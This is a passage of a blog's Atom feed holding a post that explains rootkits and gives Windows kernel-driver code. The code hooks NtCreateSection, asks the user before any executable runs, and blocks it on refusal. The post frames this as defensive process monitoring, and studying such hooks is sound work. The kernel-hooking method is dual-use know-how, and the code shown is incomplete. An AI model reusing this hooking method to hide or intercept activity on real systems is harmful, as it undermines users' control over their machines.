&amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;  END:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;  return r;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Welcome to communicate: &lt;a href=&quot;https://762131828@qq.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Server&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Pocess</title>
    <link href="http://yoursite.com/2017/09/18/new5/"/>
    <id>http://yoursite.com/2017/09/18/new5/</id>
    <published>2017-09-18T10:59:07.781Z</published>
    <updated>2017-10-13T15:52:19.843Z</updated>
    
    <content type="html"><![CDATA[<p>What is a rootkit? It is estimated that many friends do not understand, simply said, Rootkit is a special kind of malicious software, its function is<br>In the installation of the target to hide their own and specify the documents, processes and network links and other information, more common is the rootkit generally and wood<br>Horse, back door and other malicious programs used in combination. Rootkit by loading a special driver, modify the system kernel, and then to hide the letter<br>The purpose of interest. Technology is a double-edged sword, we study it is the purpose, through our research, with this technology to protect our system,<br>So that our system more robust, give full play to the positive application of this technology.</p><h2 id="Process-monitoring"><a href="#Process-monitoring" class="headerlink" title="Process monitoring"></a>Process monitoring</h2><h3 id="Create-a-new-drive"><a href="#Create-a-new-drive" class="headerlink" title="Create a new drive"></a>Create a new drive</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div></pre></td><td class="code"><pre><div class="line">ULONG __stdcall check(PULONG arg)//获得指向服务参数指针</div><div class="line">&#123;</div><div class="line"></div><div class="line">  HANDLE hand=0;PFILE_OBJECT file=0;</div><div class="line"></div><div class="line">  POBJECT_HANDLE_INFORMATION info=0;ULONG a;char*buff;</div><div class="line">  ANSI_STRING str; LARGE_INTEGER li;li.QuadPart=-10000;</div><div class="line"></div><div class="line"><span class="keyword">if</span>((arg[4]&amp;0xf0)==0)<span class="built_in">return</span> 1;//检测标志</div><div class="line"><span class="keyword">if</span>((arg[5]&amp;0x01000000)==0)<span class="built_in">return</span> 1;//检测属性</div><div class="line"></div><div class="line"></div><div class="line">//通过文件句柄获得文件名</div><div class="line">hand=(HANDLE)arg[6];//获得执行文件句柄</div><div class="line"></div><div class="line">ObReferenceObjectByHandle(hand,0,0,KernelMode,&amp;file,info);//&amp;file获得对象体指针</div><div class="line"><span class="keyword">if</span>(!file)<span class="built_in">return</span> 1;</div><div class="line"></div><div class="line">RtlUnicodeStringToAnsiString(&amp;str,&amp;file-&gt;FileName,1);</div><div class="line"></div><div class="line">a=str.Length;buff=str.Buffer;</div><div class="line"></div><div class="line"><span class="keyword">while</span>(1)//通过循环判断是不是有<span class="string">". "</span>标志</div><div class="line">&#123;</div><div class="line">  </div><div class="line"><span class="keyword">if</span>(buff[a]==<span class="string">'.'</span>)</div><div class="line">&#123;a++;<span class="built_in">break</span>;&#125;</div><div class="line"></div><div class="line">  a--;</div><div class="line"></div><div class="line">&#125;</div><div class="line">ObDereferenceObject(file);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span>(_stricmp(&amp;buff[a],<span class="string">"exe"</span>))&#123;RtlFreeAnsiString(&amp;str);<span class="built_in">return</span> 1;&#125;//判断是否为可执行文件</div><div class="line"></div><div class="line"></div><div class="line"> </div><div class="line">KeWaitForSingleObject(&amp;event,Executive,KernelMode,0,0);//将当前线程置于等待状态知道信号态</div><div class="line"></div><div class="line"></div><div class="line">strcpy(&amp;output[8],buff);//将string复制进buff</div><div class="line">RtlFreeAnsiString(&amp;str);</div><div class="line"></div><div class="line">a=1;//用户的决定通过a的制来反映</div><div class="line">memmove(&amp;output[0],&amp;a,4);</div><div class="line"><span class="keyword">while</span>(1)</div><div class="line">&#123;</div><div class="line">KeDelayExecutionThread(KernelMode,0,&amp;li);//在一个固定时间间隔内当前线程处于等待状态</div><div class="line">memmove(&amp;a,&amp;output[0],4);</div><div class="line"><span class="keyword">if</span>(!a)<span class="built_in">break</span>;</div><div class="line">&#125;</div><div class="line">memmove(&amp;a,&amp;output[4],4);</div><div class="line"></div><div class="line">KeSetEvent(&amp;event,0,0);</div><div class="line"></div><div class="line"><span class="built_in">return</span> a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">//保存执行文件上下文，调用check()函数</div><div class="line">_declspec(naked) Proxy()</div><div class="line">&#123;</div><div class="line"></div><div class="line">_asm&#123;</div><div class="line"></div><div class="line">pushfd</div><div class="line">pushad</div><div class="line">mov ebx,esp</div><div class="line"></div><div class="line">add ebx,40</div><div class="line">push ebx</div><div class="line"></div><div class="line">call check</div><div class="line"></div><div class="line">cmp eax,1//由check()的返回值判断是否让可执行文件继续执行</div><div class="line">jne block</div><div class="line"></div><div class="line"></div><div class="line">popad</div><div class="line">popfd</div><div class="line">jmp RealCallee//通过，调用ntcreatesection</div><div class="line"></div><div class="line"></div><div class="line">block:popad</div><div class="line">mov ebx, dword ptr[esp+8]</div><div class="line"></div><div class="line">mov dword ptr[ebx],0</div><div class="line">mov eax,0xC0000022L//不让其通过，返回STATUS_ACCESS_DENIED</div><div class="line">popfd</div><div class="line">ret 32</div><div class="line"></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">到此，驱动程序的工作基本完成，所以在用户程序中用到一个线程来等待驱动的判断结果。</div><div class="line"> char*name=(char*)&amp;outputbuff[8];</div><div class="line"></div><div class="line">        <span class="keyword">for</span>(x=0;x&lt;stringcount;x++)</div><div class="line"></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(!stricmp(name,strings[x]))&#123;a=1;goto skip;&#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">        strcpy(msgbuff, <span class="string">"Do you want to run "</span>);</div><div class="line">        strcat(msgbuff,&amp;outputbuff[8]);</div><div class="line"></div><div class="line">        </div><div class="line">        <span class="keyword">if</span>(IDYES==MessageBox(0, msgbuff,<span class="string">"WARNING"</span>,</div><div class="line">           MB_YESNO|MB_ICONQUESTION|0x00200000L))</div><div class="line"></div><div class="line">        &#123;a=1; strings[stringcount]=_strdup(name);stringcount++;&#125;</div><div class="line">        <span class="keyword">else</span> a=0;</div><div class="line">    </div><div class="line">        // write response to the buffer, and driver will get it</div><div class="line">        skip:memmove(&amp;outputbuff[4],&amp;a,4);</div><div class="line"></div><div class="line">        //让驱动继续</div><div class="line">        a=0;</div><div class="line">        memmove(&amp;outputbuff[0],&amp;a,4);</div><div class="line">&#125;&#125;</div></pre></td></tr></table></figure><p>More info: <a href="https://baike.baidu.com/item/rootkit/6356777?fr=aladdin" target="_blank" rel="external">Rootkit</a><br><a id="more"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;What is a rootkit? It is estimated that many friends do not understand, simply said, Rootkit is a special kind of malicious software, its function is&lt;br&gt;In the installation of the target to hide their own and specify the documents, processes and network links and other information, more common is the rootkit generally and wood&lt;br&gt;Horse, back door and other malicious programs used in combination. Rootkit by loading a special driver, modify the system kernel, and then to hide the letter&lt;br&gt;The purpose of interest. Technology is a double-edged sword, we study it is the purpose, through our research, with this technology to protect our system,&lt;br&gt;So that our system more robust, give full play to the positive application of this technology.&lt;/p&gt;
&lt;h2 id=&quot;Process-monitoring&quot;&gt;&lt;a href=&quot;#Process-monitoring&quot; class=&quot;headerlink&quot; title=&quot;Process monitoring&quot;&gt;&lt;/a&gt;Process monitoring&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-drive&quot;&gt;&lt;a href=&quot;#Create-a-new-drive&quot; class=&quot;headerlink&quot; title=&quot;Create a new drive&quot;&gt;&lt;/a&gt;Create a new drive&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;76&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;77&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;78&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;79&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;81&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;82&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;83&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;84&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;85&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;86&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;87&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;88&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;89&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;91&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;92&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;93&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;94&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;95&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;96&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;97&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;98&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;99&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;100&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;102&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;103&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;104&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;105&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;106&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;107&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;108&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;109&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;110&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;111&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;112&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;113&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;114&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;115&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;116&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;117&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;118&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;119&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;120&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;121&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;122&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ULONG __stdcall check(PULONG arg)//获得指向服务参数指针&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  HANDLE hand=0;PFILE_OBJECT file=0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  POBJECT_HANDLE_INFORMATION info=0;ULONG a;char*buff;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  ANSI_STRING str; LARGE_INTEGER li;li.QuadPart=-10000;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((arg[4]&amp;amp;0xf0)==0)&lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; 1;//检测标志&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((arg[5]&amp;amp;0x01000000)==0)&lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; 1;//检测属性&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//通过文件句柄获得文件名&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;hand=(HANDLE)arg[6];//获得执行文件句柄&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ObReferenceObjectByHandle(hand,0,0,KernelMode,&amp;amp;file,info);//&amp;amp;file获得对象体指针&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!file)&lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; 1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;RtlUnicodeStringToAnsiString(&amp;amp;str,&amp;amp;file-&amp;gt;FileName,1);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;a=str.Length;buff=str.Buffer;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(1)//通过循环判断是不是有&lt;span class=&quot;string&quot;&gt;&quot;. &quot;&lt;/span&gt;标志&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(buff[a]==&lt;span class=&quot;string&quot;&gt;&#39;.&#39;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;a++;&lt;span class=&quot;built_in&quot;&gt;break&lt;/span&gt;;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  a--;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ObDereferenceObject(file);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(_stricmp(&amp;amp;buff[a],&lt;span class=&quot;string&quot;&gt;&quot;exe&quot;&lt;/span&gt;))&amp;#123;RtlFreeAnsiString(&amp;amp;str);&lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; 1;&amp;#125;//判断是否为可执行文件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;KeWaitForSingleObject(&amp;amp;event,Executive,KernelMode,0,0);//将当前线程置于等待状态知道信号态&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;strcpy(&amp;amp;output[8],buff);//将string复制进buff&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;RtlFreeAnsiString(&amp;amp;str);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;a=1;//用户的决定通过a的制来反映&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;memmove(&amp;amp;output[0],&amp;amp;a,4);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(1)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;KeDelayExecutionThread(KernelMode,0,&amp;amp;li);//在一个固定时间间隔内当前线程处于等待状态&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;memmove(&amp;amp;a,&amp;amp;output[0],4);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!a)&lt;span class=&quot;built_in&quot;&gt;break&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;memmove(&amp;amp;a,&amp;amp;output[4],4);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;KeSetEvent(&amp;amp;event,0,0);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; a;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;//保存执行文件上下文，调用check()函数&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;_declspec(naked) Proxy()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;_asm&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pushfd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pushad&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mov ebx,esp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;add ebx,40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;push ebx&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;call check&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cmp eax,1//由check()的返回值判断是否让可执行文件继续执行&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;jne block&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;popad&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;popfd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;jmp RealCallee//通过，调用ntcreatesection&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;block:popad&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mov ebx, dword ptr[esp+8]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mov dword ptr[ebx],0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mov eax,0xC0000022L//不让其通过，返回STATUS_ACCESS_DENIED&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;popfd&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ret 32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;到此，驱动程序的工作基本完成，所以在用户程序中用到一个线程来等待驱动的判断结果。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; char*name=(char*)&amp;amp;outputbuff[8];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(x=0;x&amp;lt;stringcount;x++)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!stricmp(name,strings[x]))&amp;#123;a=1;goto skip;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        strcpy(msgbuff, &lt;span class=&quot;string&quot;&gt;&quot;Do you want to run &quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        strcat(msgbuff,&amp;amp;outputbuff[8]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(IDYES==MessageBox(0, msgbuff,&lt;span class=&quot;string&quot;&gt;&quot;WARNING&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;           MB_YESNO|MB_ICONQUESTION|0x00200000L))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#123;a=1; strings[stringcount]=_strdup(name);stringcount++;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; a=0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        // write response to the buffer, and driver will get it&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        skip:memmove(&amp;amp;outputbuff[4],&amp;amp;a,4);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //让驱动继续&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        a=0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        